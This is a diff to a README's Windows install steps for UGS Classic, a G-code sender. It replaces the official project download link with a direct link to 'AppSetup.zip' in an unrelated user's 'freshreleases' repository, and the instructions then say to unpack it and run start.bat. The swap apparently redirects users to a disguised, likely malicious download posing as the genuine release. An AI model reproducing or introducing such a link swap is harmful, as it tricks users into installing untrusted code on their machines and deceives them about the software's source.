@@ -11,7 +11,7 @@
 
 ### Windows
 * Download and install **Java 8** from [here](https://java.com/en/download/)
-* Download **UGS Classic** from [here](https://github.com/winder/Universal-G-Code-Sender#downloads)
+* Download **UGS Classic** from [here](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 * Unpack the zip package
 * Run the start script ```start.bat```
 
